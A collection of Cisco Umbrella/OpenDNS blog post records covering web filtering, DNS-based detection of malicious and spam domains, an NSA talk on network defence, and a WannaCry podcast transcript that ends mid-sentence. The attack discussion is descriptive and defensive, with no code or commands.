{"website": "Cisco-Umbrella", "title": "Some Thoughts on the Approval of .XXX", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/some-thoughts-on-the-approval-of-xxx", "abstract": "Late last week, the Internet Corporation for Assigned Names and Numbers (ICANN) gave final approval to a new top-level domain , or TLD. It’s one that people have been debating, proposal, advocating for, and advocating against for years — .XXX. Over the past 11 years, .XXX has been proposed and voted on a number of times. And while it still isn’t clear when and how .XXX will be implemented, it’s certainly of interest to those of us in the DNS and Web content filtering space. Here are some initial thoughts: There is no incentive for an adult website to leave their .com domain and move to .xxx. Most sites will probably end up having both a .com and a .xxx domain, but there’s no reason for a successful adult website to move entirely over to .xxx. There may not even really be justification for a new adult site to make a home in .xxx. .xxx doesn’t make it much easier to block adult content, because even though an entire TLD can be filtered, it certainly won’t be comprehensive (see point #1). Overall, introducing .xxx now — instead of 11 years ago when first introduced, or even better, when the primary TLDs were created — will have little to no effect on the adult industry and their domain name TLD choices. There’s a significant monetary aspect to adding .xxx as well. While most domains are $10 per year, .xxx domains will cost $60 to register. Certainly registrars have a vested interest in seeing .xxx approved for their own gain. The cost to registrants and trademark holders will be significant. Though .xxx websites aren’t available yet, we know keeping adult content off networks is a big priority for our millions of parents and businesses using OpenDNS in their workplaces, school districts and homes with children. If you enter .xxx as one of your blocklist options on the Web content filtering section of your dashboard, you can block the .xxx TLD today so that when it does go live, you are already configured the way you want to be. We haven’t decided if we’ll add the entire .xxx TLD to any of our categories just yet; it might be too crude a hammer to try and block content with, as there will likely be significant non-adult sites in the .xxx TLD once it goes live.", "date": "2011-03-23"},
{"website": "Cisco-Umbrella", "title": "Introducing new Web filtering categories from OpenDNS", "author": ["Vinny LaRiza"], "link": "https://umbrella.cisco.com/blog/introducing-new-web-filtering-categories-from-opendns", "abstract": "Today we announce several improvements to the Domain Tagging system, our content categorization engine, as well as two new categories that you can enable for your networks, effective immediately. As with every new feature we deliver, these improvements were the direct result of your feedback.  Our team spent weeks evaluating both the current categories and your suggestions, and ultimately we decided which categories need to be added and which ones could use a facelift. We got hundreds of requests from the Domain Tagging community through the “suggest a new category” link, we reviewed dozens of vibrant conversations in IdeaBank and our support team heard you loud and clear when your blocklists filled up. Without further ado, here are the new additions: Anime/Manga/Webcomic: Sites that host online comics, cartoons & graphic novels. Web Spam: Click/Survey/Pharmaceutical:  Redirect targets containing unwanted Sweepstakes/Survey/Advertisements for free merchandise, pharmaceutical spam or rolex distributions. Starting today, if you’d like to block either of these categories, simply log in to your Dashboard and adjust your custom settings. Our team and the tireless Domain Tagging community has searched the Internet far and wide to ensure these categories are robust. They already include the most popular sites in these categories, and will get stronger and more comprehensive in short order.  To our knowledge, OpenDNS is the first and only filtering service to offer a Web spam category, though Web spam is increasingly present online. We’ve also decided to improve four existing categories, adding additional content to each.  The Health and Fitness category will now include fitness-related sites, in addition to sites that offer information about health care and health services.  We’ve also added video and real-time chat to the Chat category. Due to the increasing popularity of Martial Arts and MMA we’ve added it to our Sports category. Finally, our Classifieds category now includes sites with real estate and housing listings. As the Internet evolves we’ll continue to evaluate our Web filtering categories and your requests to make sure we’re ahead of the curve. If you’d like to get more involved, join our Domain Tagging community and help make the Internet better for millions around the world!", "date": "2012-06-21"},
{"website": "Cisco-Umbrella", "title": "Field Reports: Why National Holdings Replaced SonicWALL with OpenDNS Enterprise", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/field-reports-why-national-holdings-replaced-sonicwall-with-opendns-enterprise", "abstract": "This week we’re very excited to share with you that one of our new customers is the leading independent advisor and broker services company National Holdings (NHLD). In this edition of Field Reports, we look at why they chose to replace their SonicWALL solution with OpenDNS Enterprise. Before switching to OpenDNS Enterprise the company’s network was plagued by bottlenecks, inefficient malware protection, and inconsistent Internet performance across its 13 locations. They went in search of a lightweight and less complicated way to filter Internet traffic, with hopes it would speed up their network and provide an improved approach to malware protection. NHLD selected OpenDNS Enterprise for a variety of reasons. First, an easy-to-setup trial of the service proved that it does exactly what it claims. Second, multiple features including Block Page Bypass, customized block/allowlists and email notifications make Web filtering management and reporting a breeze. Third, because Web filtering categories and malicious domains lists are updated in real time through the cloud, the NHLD IT team no longer has to worry about spending time on software upgrades or manual updates. Finally, OpenDNS Enterprise allowed NHLD to add a scalable layer of proactive Internet security for a very low total cost of ownership. William Silliman, CTO for NHLD, had this to share: “OpenDNS Enterprise is the ideal platform to accomplish Web filtering and malware protection as the DNS-based service has little-to-no installation requirements for all our systems. We went from a Web filtering solution that was cumbersome and slowed Internet services to a solution that works at the speed of the Internet.” Silliman and his team are thrilled with the speed, ease, and reliability of OpenDNS Enterprise. The switch has allowed the company to more efficiently allocate its valuable IT resources as well as properly manage and secure the company’s 13 locations. Silliman tells us, “OpenDNS Enterprise just works. In addition to freeing up my IT team’s time, it has also lowered our blood pressure. I always recommend it.”", "date": "2012-06-27"},
{"website": "Cisco-Umbrella", "title": "Visualizing Domain Registration Relationships by WHOIS Information", "author": ["Anthony Kasza"], "link": "https://umbrella.cisco.com/blog/visualizing-domain-registration-relationships-whois", "abstract": "In the course of investigating suspect domains, a few sources of data are typically considered. The first source that most would think of is VirusTotal , and for good reason. A less commonly used source is Whois. We’ve used Whois information previously to observe exploit kit domain life cycles, comparing query volumes to registration dates. By sampling our domain intelligence, a list of malicious domains was created. Querying a proprietary Whois database, a list of email addresses, which have been used to register at least one malicious domain, was created. Applying a technique often referred to as reverse Whois, this list of email addresses was then used to expand the original domain list. Feeding the labeled domains and email addresses to a semantic network library and then to OpenGraphiti – our soon-to-be open sourced 3d visualization engine , some interesting relationships were observed. Groupings of domains which share a registrant contact email address are explored below. Red nodes are known malicious domains (blocklisted by OpenDNS ), green nodes are known benign domains (allowlisted by OpenDNS) and white nodes are either domains with no alignment, or no email addresses. Some email addresses from our research are associated with a mix of malicious and benign domains: Some email addresses were seen to have registered only a few malicious domains. Possible explanations include misclassification of the malicious domain, the domain was compromised and repurposed maliciously, or perhaps the domain was malicious, sinkholed, and had its registrant contact email updated. It’s also possible that the email address used to register the domains was at some point compromised and used to register a domain for malicious use: Some email addresses registered a balanced mix of good, bad, and benign domains: Some email addresses were observed to have registered one allowlisted domain, a few blocklisted domains, and a large set of benign domains: Many groups had a majority of domains in our blocklist with a small minority of sibling domains categorized as benign. These particular groups are interesting as the benign domains (white) are highly suspect: A large majority of the groups formed looked like the image below. Notice some domains are blocklisted and most are unknown. Having such a large number of domains, with a mix of alignments, sharing a single registrant contact email address is indicative of a proxy registration service. In these cases the sibling domains are likely unrelated to each other: Similar to proxy registration email address groupings, abuse desks are another type of large group that are usually comprised of half unknown and half blocklisted domains. The lower right point in the below graphic is an abuse desk email address, while the rest of the nodes are domains registered with that Whois registrant contact email address. Red nodes are known malicious domains, while white nodes are domains with unknown or benign intent. If a domain’s Whois contact email address has recently been changed to a registrar’s abuse desk, chances are the domain has an outstanding abuse complaint and is under investigation: Though our research into registrant-to-maliciousness has just begun, the initial results look promising enough to continue gathering data and investigating the results.", "date": "2014-07-21"},
{"website": "Cisco-Umbrella", "title": "Spikes and Query Patterns", "author": ["Thomas Mathew"], "link": "https://umbrella.cisco.com/blog/spikes-and-query-patterns", "abstract": "A spike in DNS queries can sometimes be an indicator that a certain domain is either hosting malicious content (such as an exploit kit) or serving as a command-and-control (C2) server. However, relying solely on spiking traffic is often not enough. Many benign websites have spikes in traffic that are not related to malware activity but instead a popular blog post or a referral from a big traffic website (reddit, NYTimes, etc). This blog post will be examining the different types of spikes we see across OpenDNS’s worldwide resolvers. One simple method to filter out benign domains that have a spike in DNS queries over an hour is to look at the historical trend of DNS queries to that domain. This filter looks at the average traffic received by a domain over the course of a specified time window and discards domain which have an average traffic over a certain threshold. This crude filter works well in removing domains who historically have had near constant traffic with few deviations. The class of domains removed by this filter are rarely malicious. Simple filters can help bubble up websites that are potentially malicious such as *[.]escortlarankaratr[.]net – a compromised domain hosting the nuclear exploit kit. However, challenges still lie. The following domain is a good example of a false positive that can occur. Lets examine the following query pattern for the domain umuthuzmeleri[.]files[.]wordpress[.]com: Here is an example of a domain experiencing a sharp spike in traffic. However, a manual investigation of the site reveals that it is not hosting any malicious material (at the time of the spike). Ideally, we would like to see if looking at query data we can find some information that would allow us to identify this spike as benign. Once again looking at the historical query history of the domain provides some valuable information. Let us zoom into the data for a week snapshot before the spike: Historically this domain received low traffic but in a consistent pattern that was repeated over a week. This type of traffic pattern is most likely associated with a normal website. Our first filter was a basic filter which removed domains that had an average hourly DNS request count over some threshold. Our second filter will capture the periodic behavior of request traffic and filter out domains that exhibit periodic behavior for some specified time window. We create a composite signal which represents the average behavior of periodic DNS queries to websites with low traffic. A cutoff filter is created which filters out domains which have periodic signals which deviate by small error constant from the original composite signal. A more sophisticated filter could be created but the goal is to create a quick filter which will allow us to rapidly prototype and test out ideas. This filter serves as an easy and quick way to filter out a large class of false positives. Development and analysis of the more complicated filters used will be subject of another blog post. There is another piece of information that we can use to help augment our decision making. Let us see if any of the clients requesting the domain during the large spike are on any known spam blocklist. Interestingly, the majority of clients participating in the spike were seen on blocklists created by Project HoneyPot. The spike could be a possible attempt by an attacker to perform a mail inject or brute force a password. As a result, we do not classify this domain as malicious but instead monitor for suspicious redirects coming from the website. This could be a sign that the spammers who created the spike were suspicious in compromising the website. Relying on traffic patterns and well established blocklist we can help identify and label different types of spikes that we see. Future work involves designing a method to cluster the different types of spikes. Clustering provides an analyst an easy way to visualize patterns within spiking domains. It also serves as useful preprocessing step before further classification.", "date": "2015-06-10"},
{"website": "Cisco-Umbrella", "title": "DNS and Spam", "author": ["Thomas Mathew"], "link": "https://umbrella.cisco.com/blog/dns-and-spam", "abstract": "DNS data (unlike webpage data) does not contain a significant amount of lexical content information. The only lexical content available is the domain name. Domain names are limited by 253 characters and this makes it challenging to make inferences about the validity of content on the webpage. Consequently, one cannot rely solely on the domain name to help detect new mass spam domains. Luckily, one can use other signals present in DNS data to potentially detect possible spam domains. Today’s blog post will be a brief introduction into a set of methods that can be used to identify possible spam domains in your DNS data. In previous blog posts we discussed using DNS traffic patterns to categorize different types of sites. The pattern examined was a spike in traffic. Many classes of spam domains also exhibit spikes in traffic either when people click on links contained in the spam email or when a domain is used as a exploited mail relay. Identifying categories of spam domains was aided by the use of URIBL. URIBL is a realtime URI blocklist used by many mail servers to determine if an incoming piece of mail is associated with a URI on the blocklist. Luckily for us queries to URIBL are made via DNS. This allows us to collect information regarding the domains queried by various mail servers during the course of the day. After collecting a couple hundred URIBL queries and parsing these queries for the embedded URIs we have a list of domains potentially associated with spam. We are most interested in signals regarding the query patterns of these domains. Our hypothesis is that a certain group of these domains all have very similar query patterns. One query pattern that we have studied is the spike. Consequently, we check what domains from the URIBL list also appear on our spike list. Interestingly about 65% of domains that appear in our URIBL list also appear in our list of spiked domains. This is a strong indicator that we have a found a useful signal to identify potentially spammy domains. Spikes that fall into the spammy category have two special characteristics that distinguish them from other domains that have spiked. First, the height of the spike for these domains occupy the 98 percentile of spike height. They have substantially higher in size than other domains that have experienced a spike. This could be caused by the amount spam emails sent out. Second, they usually include a qtype of 15 which refers to a mail server request. Here is an example of how one such spammy spiked domain appears on Investigate: What was interesting was then following up on the IP that hosted this domain. Interestingly it hosted set of similarly patterned domain names that also all happened to spike in a 2-3 hour window. This lends further evidence that this domain was potentially involved in a spam run. Unfortunately, these domains either have WhoisGuard protection or do not have any available Whois information to help us to further follow up research. A future challenge for researchers is to determine where these domains lie in the overall spam chain. The majority of these domains no longer resolve or load up blank pages. Identifying the actual content on the page might help us discover their role in the future. DNS data might not contain the content information of webpages but in conjunction with other sources of data it can be used to identify potentially new threats.", "date": "2015-10-15"},
{"website": "Cisco-Umbrella", "title": "NSA TAO Chief Talks Nation State Hacks At Usenix Enigma Conference", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/nsa-tao-chief-talks-nation-state-hacks-at-usenix-enigma-conference", "abstract": "Last week, San Francisco played host to the inaugural Usenix Enigma Conference. The event featured talks on several hot-button security topics, including vulnerabilities in medical devices and vehicles, competitive hacking, and trustworthy computing. However, the conference organizers clearly saved the best — and most controversial — for last. Closing the event was Rob Joyce , chief of Tailored Access Operations for the NSA. Tailored Access Operations, or TAO, essentially operates as the NSA’s hacking squad. The organization’s responsibility is to monitor and gather intelligence on computer systems used by foreign entities. Given the contentious reaction of NSA activities since the Snowden revelations, to hear from the Chief of this office at an industry event was a rare treat, especially given the topic of his presentation: disrupting nation state hackers. Conference attendees took note, and many came to a similar conclusion: one might call the NSA nation state hackers. This turned Joyce’s presentation into a unique look at not only NSA operations, but how to combat tactics used by highly sophisticated bad actors. “If you really want to protect your network you have to know your network, including all the devices and technology in it,” Joyce said. “In many cases we know networks better than the people who designed and run them.” As the Register pointed out , Joyce outlined the six-point strategy used by the NSA to infiltrate a target: “reconnaissance, initial exploitation, establish persistence, install tools, move laterally, and then collect, exfiltrate, and exploit the data.” Similar to criminal and nation state sponsored hackers, Joyce said, “we need that first crack and we’ll look and look to find it. There’s a reason it’s called an advanced persistent threat; we’ll poke and poke and wait and wait until we get in.” When the talk turned to defense, Joyce outlined several best practices for companies and security professionals alike: Watching out for favorite attack vectors: malicious email attachments, injection attacks from websites, and removable media Making sure all systems are patched and updated Locking systems down: allowlisting apps, strict permissions, and using reputation management As for zero-days, the attacks that usually come up in any conversation involving “APT”, Joyce had this to say: “A lot of people think that nation states are running their operations on zero-days, but it’s not that common. For big corporate networks, persistence and focus will get you in without a zero day. There are so many more vectors that are easier, less risky, and more productive.” You can, and should, watch the full presentation on YouTube:", "date": "2016-02-03"},
{"website": "Cisco-Umbrella", "title": "Root Access Podcast S2:E6: Inside of the WannaCry Ransomware Attack", "author": ["Niki Acosta"], "link": "https://umbrella.cisco.com/blog/root-access-podcast-s2e6-inside-wannacry-ransomware-attack", "abstract": "It’s May, which means it has been one year since the infamous WannaCry attack, an unprecedented malware attack spread worldwide in a matter of hours, infecting 75,000 computers in more than 70 countries. That’s according to Ars Technica, who shared the news on May 12, 2017, in an article titled, “ An NSA-derived ransomware worm is shutting down computers worldwide .” By the time the attack was stopped about a day later, the number of infected machines had reached 300,000 in more than 150 countries. The impact was felt globally, affecting individuals, hospitals, schools, businesses, and homes. Lloyd’s of London estimated the cost of WannaCry at $8 billion. In this episode, host Mike Storm takes a deep dive with the people who were on the frontlines of the WannaCry attack as it happened. Who was responsible? Who was impacted? What have we learned from the WannaCry, Nyetya, NotPetya attacks? What is being done to prevent this type of attack in the future? Whether you’re new to security, a seasoned security professional, or you’ve stumbled across this in a quest to learn more about these specific attacks, you’ve come to the right place. Enjoy this insightful and interesting podcast episode! The Root Access Podcast is sponsored by Cisco Umbrella. More information and free trials available at: signup.umbrella.com Transcripts: Root Access S2:E6: WannaCry Owen Lystrup: Hello dear listeners. Root Access writer and producer Owen Lystrup here. I just wanted to take a moment and let you know that this will be the final episode of Root Access season two. Before we dive into it, I wanna thank everyone for tuning in and keeping with us. Next season we’ll be adding significantly to our staff and we’ll have some great episodes in the lineup for season three. Hit subscribe and give us a review on iTunes or SoundCloud or Google Play, or wherever it is you go to get our voice into your ears. Now, onto the episode. Take it away, Mike. Mike Storm: Last season the Root Access team covered ransomware. At the time, it had gone from an attack novelty to a full-blown security epidemic. Last May, the entire ransomware game changed for the worst. Speaker 3: I’d like to talk to you today about a cyber issue of significance in May of this year. A dangerous cyberattack known as WannaCry spread rapidly and indiscriminately across the world. The malware encrypted and rendered useless hundreds of thousands of computers in hospitals, schools, businesses, and homes in over 150 countries. While victims received ransom demands, paying those demands did not unlock their computers. This was a careless and reckless attack. It affected individuals, industry, governments, and the consequences were beyond economic. Mike Storm: In this episode of Root Access, we’re going to revisit two of the largest ransomware attacks just before their anniversary. We’ll examine what we’ve learned, what we need to work on, and where hackers might be going next. In May of 2017, an unprecedented malware attack spread worldwide in a matter of hours. It caught the entire security community, not to mention its victims, completely off-guard. Around noon on May 12th, Ars Technica first reported that a ransomware attack had been observed by numerous security researchers and was spreading quickly, infecting 75,000 computers in more than 70 countries. No one knew exactly how it was spreading or who was behind it yet, but it was clear that whoever it was meant business. By the time the attack was stopped about a day later, the number of infected machines had reached 300,000 in more than 150 countries. Craig Williams: You know, when this first happened, people panicked. A lot of companies came out and said it was actually spreading over email. At the end of the day, it couldn’t have been further from the truth. WannaCry was actually the world’s first ransomware worm that was spreading using the EternalBlue vulnerability. This was one of those worms that was not trying to spread in a hidden manner. It was spreading across the internet, and laterally within networks as loudly and as fast as it could. It’s kind of a catch-22, because on one hand attackers wanted to spread quickly so they could monetize it, but on the other hand it gets security researchers and law enforcements attention immediately. Mike Storm: This is Craig Williams. He’s a senior technical leader and outreach manager for Cisco Talos. You might remember him talking about hacker screw-ups in Root Access season one. We had the chance to sit down with Craig again to talk about the WannaCry event. Talos was one of the first teams to discover this attack and nail down the attack vectors as the global spread intensified. WannaCry had multiple moving pieces that made it one of the most fascinating and significant events the world has ever seen. From the makeup of the ransomware to the targets it hit, even the exploit it used, even the way that the attack was eventually stopped, this is a cyber security case study for the ages. You heard Craig mention two important points. They are a major part of why this attack was so important, and why it’s the focus for this episode. The first important point is that WannaCry was a worm. Worms have been in existence since the Morris worm back in the 80’s. This event had a worm-like spread with a ransomware component, which makes it unique and really damaging. Not only was it self-propagating, but it required no user interaction to infect and spread, but we’ll get to that in a little bit. The other word Craig mentioned was the name EternalBlue. The EternalBlue exploit, along with a large collection of other zero day tools was stolen and then leaked to the public by a group called Shadow Brokers. That group could be an entire episode on its own. This entire topic in fact, could spark a lengthy and circular ethical debate about whether or not the US government is responsible, or whether Shadow Brokers are responsible, or whether system administrators are responsible for not patching. It’s not our place to hash these things out. The fact is, a taster’s choice collection of exploits did get out into the wild, and hackers immediately started using them because they work, especially EternalBlue. One former NSA agent spoke to the Washington Post and described it as “fishing with dynamite.” It was an absolute sure thing. Well, early versions apparently caused some Windows installs to blue screen, but they fixed that, and then, it became a sure thing. Let’s talk about how this thing works. EternalBlue uses a flaw in a protocol known as SMB. I’m sure you’re familiar with it, since it’s been around since 1990 or so. Just in case you’re not, SMB stands for Server Message Block. It’s a network protocol that operates over TCP port 445 and a few others, and it’s used mostly for remotely controlling printers, file sharing, and communicating between server nodes. These are the type of operations that you do not want to be open to the public internet obviously. The general sentiment is to not leave port 445 or any other SMB port open, but of course, people still do it. EternalBlue establishes a sort of foothold by exploiting the open 445 port. A second shadow broker’s exploit called DoublePulsar creates a functional backdoor. The malware then runs and encrypts pretty much any useful file on the machine and pops up the infamous ransomware screen demanding a bitcoin payment. Nothing so far makes this form of ransomware unique, with exception of the exploits used and where those exploits come from. What makes WannaCry unique comes after a host is compromised. Once the malware payload is dropped and the backdoor is open, a service searches for removable storage devices and any mapped network drives. It also scans the entire IP subnet for open 445 ports, and then uses the same exploits to gain access and encrypt the files of every computer it can get to on the same network. This was the big differentiator. It’s how the worm spread from tens of thousands to hundreds of thousands of computers in just hours. Speaker 5: It looked at first like an attack just on hospitals in the UK, but it’s now becoming clear that this malicious software has run riot around the world. Russia, the United States, and many points in between have been hit by what’s now a common form of cyber crime. Speaker 6: Ransomware has become a tool of choice for an awful lot of criminals, simply because it’s very, very easy to make money very quickly. You can buy ransomware online. Speaker 7: Here in the UK, hospitals have been badly hit, including this one in Central London. Since Friday, it’s been struggling to get back online. Speaker 8: The hospital told Ken Robbins his cancer surgery was delayed. Ken Robbins: They phoned me up this morning and said it’s too important to have my operation. Coming straightaway and they’re going to do it. Speaker 10: What is your message to the hackers who have created this ransomware? Ken Robbins: To put it bluntly, [expletive]. They need to go to prison for 20 years. They don’t realize what impact they’re having on patients. Mike Storm: My guess is the actors behind WannaCry were aware of the damaging effect they were having, and according to Craig, it didn’t appear that the point of this ransomware attack was to make money. Craig Williams: I don’t think it was nearly as lucrative as it could have been, because they didn’t really have a good way to associate victims with ransom payments. Now, eventually people did start hearing about payments actually being made and victims getting their computers back, but the problem was, they combined the fastest spreading mechanism, a worm like behavior and then they had a manual payment verification system. So, it’s like having a F1 engine in a car that has a transmission with two gears, it just doesn’t work. So, people thought it was fake. My personal opinion is that it was not really designed to make money, it was designed to just damage and hold systems hostage. Mike Storm: It’s easy to dismiss an attack that demands a mere 300 bucks and doesn’t have a good way of verifying payments. It won’t exactly rake in the dough. You heard Craig say the business model was pretty flawed compared to other ransomware attacks that made millions. Estimates for this event are in the low hundred thousand range, but the ransom aspect was not the danger here. This event was deadly serious for its interruptive impact on critical systems. 61 hospitals in the UK were hit. A surgeon remarked that he was unable to look at vital CT scans for a patient who was in need of an urgent neurosurgery. With medical systems down, doctors and nurses could not process patients. There were reports of ambulances being turned away from hospitals while these systems were down. Universities and ATMs in China were hit, fuel pumps in Singapore, even one of the largest Telecom companies in Spain, and FedEx was hit here in the States. A hospital in 10 different schools in Taiwan were all hit. We had a car manufacturing facility in France that had to stop production entirely because of the event. Hours after the initial hits on the British National Health System, the control systems and timetables at Deutsche Bahn, Germany’s largest train service, were hit and service was interrupted. Speaker 11: [Recording of news announcement in German] Mike Storm: Petrobras, the state-owned petroleum company in Brazil, even their national social security system, the Foreign Ministry and court systems were all hit there. This was all done automatically in a self-perpetuating, self-propagating manner within about a 48 hour period. No tricky email attachments or elaborate phishing sites were required. The real kicker was that the majority of victims could have avoided this attack on three fronts, first, by making sure port 445 on network computers was not left open to the Internet, second, Microsoft had actually issued a patch for the exploit months before the event for all Windows versions except for Windows XP, and to be honest, if you’re a Sysadmin or IT director working in an organization that still uses XP, you need to find a new job. Thirdly… Craig Williams: Get a backup. Use the backup. Verify that your backup’s working. I can guarantee you that every single person will have a hard drive that fails. All hard drives fail. If you don’t have a backup of that hard drive, you’re going to lose that data anyway. So spend the money that you would have paid on the ransom and just buy a hard drive, it’s like 50 bucks on Amazon, they’ll ship it to you the next day. Now, the most important part though, is making sure that your backup actually works, that’s the step that most people forget. Mike Storm: Now is where we get to the really interesting parts of this story, namely the kill switch that stopped the attack, and the trojan that is potentially even more dangerous than WannaCry. Speaker 13: The hearing today was to determine whether or not Marcus would be detained as a result of the charges and the indictment. The judge agreed with me and saying that he was going to be released, pending certain conditions that he has attached to the bond and that he has to post a $30,000 cash bond, and that’s coming from a variety of sources. He has tremendous community support, local and abroad, and in the computer world. So, many people are trying to put money together and raise the amount for the bond. Mike Storm: During WannaCry’s global spread, security and threat intelligence researchers were frantically trying to get an understanding of how the malware worked. One such researcher, a 23 year old who lives in the UK and works for the security firm Kryptos Logic, was examining the malware and found a rather odd domain that the malware called out to during its course of unpacking itself and encrypting the files. It’s purpose was unknown, but it turned out to be pretty critical. Here’s Craig again. Craig Williams: WannaCry did a lot of really weird stuff. If I had to nail down the one unique feature, it was that it was the world’s first ransomware worm. It also had a lot of other really, really weird things going on. The first one, I think was that the fact that it was fairly buggy, the real first version of WannaCry actually had a broken scanning algorithm. When we first saw it, we actually were wondering if it was using a favoritism algorithm to target certain countries more than others, but it turned out that wasn’t the case, it was just using uninitialized stack variables sometimes, so the scan would just fail right away. Yeah, the other really weird part was this kill switch. Have you heard of that one? Yeah, I’ve never seen anything like that. I can’t think of any logical reason to have that in your malware. It’s just the most bizarre thing. At a really high level, what the kill switch allowed someone to do was remotely shut off the worm from a global perspective. I don’t know why a malware author would want that. It would effectively be like having a car and having someone blink a light at it a certain way and the car turns off. Why would they do that? Some people guess that it was designed to help avoid sandboxes. I don’t think that makes sense. The way the kill switch worked doesn’t seem like something a sandbox would fail. Effectively, what it did was it tried to look up this really long alphanumeric domain, it looks super sketchy, of course Umbrella saw it, and Umbrella immediately flagged it as a malware C2, because it saw so many people trying to look up this non-existent domain. So, what happened was, if the domain lookup worked, have they got a domain? Have they got a server? The worm would shut off. I think it was just a really poorly thought-out way to avoid sandboxes. I don’t know of a sandbox that operates like that. I was giving a talk at Cisco Live Cancun, and one of the audience members said they were aware of a sandbox that actually would fake look ups, but they couldn’t remember the name. So, there might be one out there, but it’s certainly not popular and I can’t think of a good reason, but that’s the best thing I can think of. Mike Storm: So, out of curiosity, this young researcher, Marcus, not knowing what the domain written into the malware is for, decides to register the domain for ten bucks, unbeknownst to him, as you heard Craig describe, this essentially killed the malware’s ability to spread. Since the malware was calling this domain as it was going through it’s infection and encryption process, once it started connecting successfully, it would halt itself. That $10 proved to be a pretty hefty price tag for Marcus, unfortunately. Marcus Hutchins: I’ve had people inundating me with messages just thanking me, saying that I’m a hero. I just registered this domain for tracking and I didn’t intend for it to blow up, and me to be all over the media. I was just doing my job and I don’t really think that I’m a hero at all. I’ve still been working of course for my company Kryptos Logic. We’ve been trying to provide the IP addresses to NCSC, the FBI, so that victims can be notified. I’ve been having queries from around the world, obviously journalists inundating me with queries. We’re just pretty much business as usual, except I have not had any sleep in three days. My lovely bosses offered me an all expenses paid vacation to Las Vegas and to Los Angeles as well, so I’m gonna head out on maybe next week, in a week’s time, I’m gonna chill out there for a bit, and then come back to work. My name is out in the papers, so my general location is, so I don’t think I’m ever going back to being the malware tech that no one knew. Mike Storm: Rather than the malware authors retaliating against Marcus for him shutting down their campaign, it ended up being the tabloid media in the UK that doxxed him. A couple days after his work examining the WannaCry malware, Marcus woke up and checked the news, there he saw his face on the front page of a major UK news outlet. According to his own account of the events on his Twitter account, malware tech blog, by day two, he was hopping over his back fence to avoid reporters who had camped outside his house. Other reporters even attempted to get to him through friends and even an ex-girlfriend. He said one of the largest UK newspapers published a picture of his house along with the full address. From there, his celebrity only increased. The bug bounty firm HackerOne gave Marcus a $10,000 bounty reward that he ended up donating to charity. Then, he received a paid vacation to the DEF CON security conference in Vegas, and that’s where things turned sour for him. Speaker 15: The man who stopped the WannaCry cyber attack was just arrested for creating a virus of his own. Marcus Hutchins, also known as MalwareTech, he was arrested for his alleged involvement in a cyber crime of his own. Hutchins is accused of helping create and distribute a malware known as the Kronos Banking Trojan. Kronos was designed to allow hackers to collect and log banker’s online information. It was first made available in 2014 and has been marketed and distributed through AlphaBay, a Marketplace on the dark web. AlphaBay has since been shut down by the DOJ. The bottom line, the man who helped stop the WannaCry hack was arrested on Wednesday. Mike Storm: On his way back home to the UK, Marcus was stopped at the airport and arrested by the FBI. He was transferred to the state of Wisconsin for a bail hearing and indicted on multiple charges related to the creation and distribution of the Kronos malware, a banking trojan that had been on the black market since about June of 2014. Marcus has denied all the charges and entered a not guilty plea in court. The difficult part for him though is he has been released on bail but forbidden to leave the country, which means he can’t go home. Since his employer is based in LA, Marcus has been staying there until his trial concludes. As for WannaCry, or Wanna Decryptor or WannaCryptor, whatever you want to call it, the registering of the kill switch was not the end. Speaker 16: WannaCry was written in such a way that it was very, very easy to modify even with a hex editor. So, within hours of the back door … sorry, not the back door, but within hours of the kill switch being turned on, people were already modifying it and mapping out that section so that it wouldn’t shut down. So, it was very easy to modify. EternalBlue, the actual vector, continued to be used in several malware variants up until today still, it’s still very effective, because people just won’t patch. Malware authors learn from each other’s mistakes. They didn’t think it a good idea and somebody else did, they’re gonna steal it. Absolutely they’re gonna keep evolving the idea. Mike Storm: So, WannaCry’s legacy continues, and it’s not just the variants in the wild that are active. Most news stories you’ll find covering the Bitcoin payments related to WannaCry stopped around August of last year. But in reality, the activity of these wallets has never stopped. There is an active Twitter account entirely devoted to tracking wallet transactions associated with WannaCry. The wallet accounts were reportedly emptied sometime in August of 2017 and the actors behind the campaign, converted the funds from Bitcoin to the more private altcoin called Monero. But the most recent payment to those crypto wallets, because they still exist, came in February of this year. So, whether they are from WannaCry infection specifically or some related malware, the attackers, or at least their attack infrastructure, appeared to be very much still active. Kryptos Logic, Marcus Hutchins’ employer even released a report just a few weeks ago on April 9th, saying that hundreds of thousands of un-patched machines are keeping this whole thing alive. As for who’s responsible and the identities behind the massive spread, it’s really anyone’s guess. News outlets were saying pretty quickly after the attack that it was North Korea and not only was it North Korea, but it was the same actors behind the Sony Pictures hack. Here is former Homeland Security Adviser Tom Bossert. Tom Bossert: After careful investigation, the United States is publicly attributing the massive WannaCry cyber attacks to North Korea. We do not make this allegation lightly. We do so with evidence and we do so with partners. Other governments and private companies agree. The United Kingdom, Australia, Canada, New Zealand and Japan have seen our analysis and they join us in denouncing North Korea for WannaCry. Commercial partners have also acted. Microsoft traced the attack to cyber affiliates of North Korean government and others in the security community have contributed their analysis. So, two questions there, one, did we do it too slowly? No, my answer is no. I think the most important thing is to do it right and not to do it fast. We took a lot of time to look through classified sensitive information. What we did was rely on, and some of it I can’t share, unfortunately, technical links to previously identified North Korean cyber tools, Tradecraft operational infrastructure, we had to examine a lot and we had to put it together in a way that allowed us to make a confident attribution. The difficulty in attribution is often to figure out who was operating the keyboard on whose behalf. So, those are the two biggest challenges. People operating keyboards all over the world on behalf of a North Korean actor can be launching from places that are not in North Korea. So, that’s one of the challenges behind cyber attribution. We’re comfortable in this case though that it was directed by the government of North Korea. We’re also comfortable in saying that there were actors on their behalf, intermediaries carrying out this attack, and that they had carried out those types of attacks on behalf of the North Korean government in the past. That was one of the Tradecraft routines that allowed us to reach that conclusion. That said, how they operate is often a little mysterious, if we knew better with perfect knowledge, we would be able to address North Korean problem with more clarity. Mike Storm: So, according to Homeland Security, it was with a high degree of certainty North Korea, based on corroborated evidence from a number of different public and private security groups. Craig and the Talos team did not weigh in on who was responsible for the very reason that you heard Tom Bossert say, attribution is hard. It’s really difficult to be certain who did what for whom. Our friends at Flashpoint, the security intelligence firm, say that it’s more likely, based on linguistic analysis, that WannaCry actually came out of China, and they wrote code to make it seem like it was North Korea. There were other reports that China even blamed the US and not North Korea for the whole situation. So, say it with me, attribution is hard. Now that attackers have seen how effective this WannaCry event was, you can bet they will be looking to modify it and repeat the same kind of attack. According to Craig Williams, that’s already happening. In fact, an attack called Nyetya or NotPetya has proved to be more sophisticated and even more effective than WannaCry. It hit only a couple of months after the WannaCry fallout. Speaker 18: The White House confirmed that Russia 